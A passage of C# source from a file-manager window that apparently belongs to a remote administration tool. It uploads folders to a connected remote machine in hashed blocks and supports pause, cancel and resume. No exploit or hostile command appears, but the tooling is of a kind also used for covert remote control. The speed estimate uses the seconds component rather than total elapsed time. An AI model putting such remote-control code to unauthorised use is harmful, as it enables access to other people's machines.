                RemotePath = remotePath;
                IsFile = isFile;
                StartBlock = startBlock;
                TransferId = transferId;
            }
        }
        private void UploadItem(object data)
        {
            var isFile = ((UploadInformation)data).IsFile;
            var path = ((UploadInformation)data).LocalPath;
            var startBlock = ((UploadInformation) data).StartBlock;
            var remotePath = ((UploadInformation) data).RemotePath;
            var transferId = ((UploadInformation) data).TransferId;

            FileSplit srcFile;
            if (!isFile)
                srcFile = new FileSplit(new VirtualDirectory(path));
            else
                srcFile = new FileSplit(path);

            var remoteDir = _currentDir;
            var startTime = DateTime.Now;
            int id;
            if (transferId == 0)
                id = FileHelper.GetNewTransferId();
            else
                id = transferId;

            string metaFilePath = Path.Combine(_connectClient.Value.DownloadDirectory, "temp", id + ".meta");

            if(transferId == 0)
                AddTransfer(id, "Upload", "Pending...", string.Concat(new DirectoryInfo(path).Name, " (Folder)"));

            int index = GetTransferIndex(id);
            if (index < 0)
                return;

           // FileSplit srcFile = new FileSplit(vDir);
            if (srcFile.MaxBlocks < 0)
            {
                UpdateTransferStatus(index, "Error reading file", 0);
                return;
            }

            if (string.IsNullOrEmpty(remotePath)) return;

            _limitThreads.WaitOne();
            for (int currentBlock = startBlock; currentBlock < srcFile.MaxBlocks; currentBlock++)
            {
                if (_connectClient.Value == null || _connectClient.Value.FrmFm == null)
                {
                    _limitThreads.Release();
                    return; // abort upload when from is closed or client disconnected
                }

                if (CanceledUploads.ContainsKey(id))
                {
                    UpdateTransferStatus(index, "Canceled", 0);
                    _limitThreads.Release();
                    return;
                }

                if (CommandHandler.PausedUploads.ContainsKey(id))
                {
                    UpdateTransferStatus(index, string.Format("Paused ({0}%)", CommandHandler.PausedUploads[id].Progress), 2);
                    _limitThreads.Release();
                    return;
                }

                index = GetTransferIndex(id);
                if (index < 0)
                {
                    _limitThreads.Release();
                    return;
                }

                decimal progress =
                    Math.Round(
                        (decimal)((double)(currentBlock + 1) / (double)srcFile.MaxBlocks * 100.0), 2);

                decimal speed;
                int timeLeft = 0;
                try
                {
                    speed = Math.Round((decimal)(currentBlock * FileSplit.MAX_BLOCK_SIZE) /
                                       (DateTime.Now - startTime).Seconds, 0);
                    timeLeft = (int)(((FileSplit.MAX_BLOCK_SIZE * (srcFile.MaxBlocks - currentBlock)) / 1000) / (speed / 1000));
                }
                catch (DivideByZeroException)
                {
                    speed = 0;
                }

                UpdateTransferStatus(index, string.Format("Uploading...({0}%)", progress), -1, TimeSpan.FromSeconds(timeLeft), speed);

                byte[] block;
                if (srcFile.ReadBlock(currentBlock, out block))
                {
                    new Core.Packets.ServerPackets.DoUploadDirectory(id,
                        remotePath, block, srcFile.MaxBlocks,
                        currentBlock).Execute(_connectClient);
                }
                else
                {
                    UpdateTransferStatus(index, "Error reading file", 0);
                    _limitThreads.Release();
                    return;
                }

                byte[] hashSample = new byte[16];
                using (var md5 = MD5.Create())
                    hashSample = md5.ComputeHash(block);

                var metaFile = new MetaFile(currentBlock, id, progress, hashSample, hashSample, remotePath, path,
                    TransferType.Upload);
                metaFile.Save(metaFilePath);

            }
            _limitThreads.Release();

            if (remoteDir == _currentDir)
                RefreshDirectory();

            if (_transferEstimates.ContainsKey(id))
                _transferEstimates.Remove(id);
            UpdateTransferStatus(index, "Completed", 1);
        }

        private void uploadFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (var fbd = new FolderBrowserDialog())
            {
                if (fbd.ShowDialog() == DialogResult.OK)
                {
                    string remotePath = Path.Combine(_currentDir, Path.GetFileName(fbd.SelectedPath));
                    new Thread(UploadItem).Start(new UploadInformation(fbd.SelectedPath, remotePath,
                        false));
                }
            }
        }

        private void pauseTransferToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem transfer in lstTransfers.SelectedItems)
            {
                if (!transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Downloading") &&
                    !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Uploading") &&
                    !transfer.SubItems[TRANSFER_STATUS].Text.StartsWith("Pending")) continue;

                int id = int.Parse(transfer.SubItems[TRANSFER_ID].Text);

                if (transfer.SubItems[TRANSFER_TYPE].Text == "Download")
                {
                    if (_connectClient != null)
                        new Core.Packets.ServerPackets.DoDownloadFilePause(id).Execute(_connectClient);
                    if (!CommandHandler.PausedDownloads.ContainsKey(id))
                        CommandHandler.PausedDownloads.Add(id,
                            new MetaFile(
                                File.ReadAllBytes(Path.Combine(_connectClient.Value.DownloadDirectory, "temp", id + ".meta"))));
                    if (CommandHandler.RenamedFiles.ContainsKey(id))
                        CommandHandler.RenamedFiles.Remove(id);
                    _transferEstimates[id].Reset();

                    UpdateTransferStatus(transfer.Index, string.Format("Paused ({0}%)", CommandHandler.PausedDownloads[id].Progress), 2);
                }
                else if (transfer.SubItems[TRANSFER_TYPE].Text == "Upload")
                {
                    if (!CommandHandler.PausedUploads.ContainsKey(id))
                        CommandHandler.PausedUploads.Add(id,
                            new MetaFile(
                                File.ReadAllBytes(Path.Combine(_connectClient.Value.DownloadDirectory, "temp", id + ".meta"))));
                    _transferEstimates[id].Reset();

                    UpdateTransferStatus(transfer.Index, string.Format("Paused ({0}%)", CommandHandler.PausedUploads[id].Progress), 2);
                }
            }
        }
    }
}